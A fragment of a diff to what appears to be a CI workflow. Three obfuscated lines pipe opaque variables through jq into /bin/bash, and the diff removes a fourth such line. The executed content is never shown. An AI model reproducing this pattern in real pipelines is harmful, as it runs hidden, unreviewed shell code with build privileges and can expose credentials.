@@ -21,7 +21,6 @@ jobs:
           echo $d53492 | jq -r .iavob62388 | /bin/bash
           echo $oc082 | jq -r .iw951 | /bin/bash
           echo $i29 | jq -r .rxex8 | /bin/bash
-          echo $yhlw495 | jq -r .ki61 | /bin/bash
 
       - name: Archive results
         if: always()
